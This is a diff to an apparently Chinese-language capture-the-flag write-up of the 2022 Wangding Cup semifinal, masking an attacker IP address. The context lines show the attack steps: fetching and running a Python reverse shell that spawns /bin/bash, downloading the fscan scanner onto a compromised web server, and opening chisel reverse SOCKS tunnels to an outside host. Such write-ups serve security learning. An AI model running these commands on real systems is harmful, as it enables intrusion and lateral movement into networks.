@@ -1,4 +1,4 @@
-# 2022 网鼎杯半决赛复盘
+# 2022 - 网鼎杯半决赛复盘
 
 :::info
 
@@ -102,11 +102,11 @@ pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped
 尝试进行反弹 shell
 
 ```shell
-(www-data:/var/www/html/wp-content/themes/twentytwentyone) $ wget 139.9.4.56:8008/reverse-python3.py
+(www-data:/var/www/html/wp-content/themes/twentytwentyone) $ wget 139.*.*.*:8008/reverse-python3.py
 (www-data:/var/www/html/wp-content/themes/twentytwentyone) $ cat reverse-python3.py
 import os,pty,socket
 s=socket.socket()
-s.connect(("139.9.4.56",9999))
+s.connect(("139.*.*.*",9999))
 [os.dup2(s.fileno(),f)for f in(0,1,2)]
 pty.spawn("/bin/bash")
 (www-data:/var/www/html/wp-content/themes/twentytwentyone) $ python3 --version
@@ -169,9 +169,9 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 上传 `fscan` 并进行扫描
 
 ```shell
-(remote) www-data@ubuntu-web:/tmp$ wget 139.9.4.56:8000/fscan_amd64.1
---2024-07-26 14:45:03--  http://139.9.4.56:8000/fscan_amd64.1
-Connecting to 139.9.4.56:8000... connected.
+(remote) www-data@ubuntu-web:/tmp$ wget 139.*.*.*:8000/fscan_amd64.1
+--2024-07-26 14:45:03--  http://139.*.*.*:8000/fscan_amd64.1
+Connecting to 139.*.*.*:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 6217056 (5.9M) [application/octet-stream]
 Saving to: ‘fscan_amd64.1’
@@ -269,9 +269,9 @@ root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse &
 ```
 
 ```shell title="入口点 172.22.15.26"
-(remote) www-data@ubuntu-web:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.9.4.56:1337 R:0.0.0.0:10000:socks &
+(remote) www-data@ubuntu-web:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 R:0.0.0.0:10000:socks &
 [1] 3364
-2024/07/26 14:54:39 client: Connecting to ws://139.9.4.56:1337
+2024/07/26 14:54:39 client: Connecting to ws://139.*.*.*:1337
 2024/07/26 14:54:39 client: Connected (Latency 43.474586ms)
 ```
 
@@ -304,9 +304,9 @@ RHOST => 172.22.15.24
 :::
 
 ```shell title="入口点 172.22.15.26"
-(remote) www-data@ubuntu-web:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.9.4.56:1337 8888:8888 &
+(remote) www-data@ubuntu-web:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 8888:8888 &
 [2] 3483
-2024/07/26 15:10:45 client: Connecting to ws://139.9.4.56:1337
+2024/07/26 15:10:45 client: Connecting to ws://139.*.*.*:1337
 2024/07/26 15:10:45 client: tun: proxy#8888=>8888: Listening
 2024/07/26 15:10:45 client: Connected (Latency 44.294711ms)
 ```
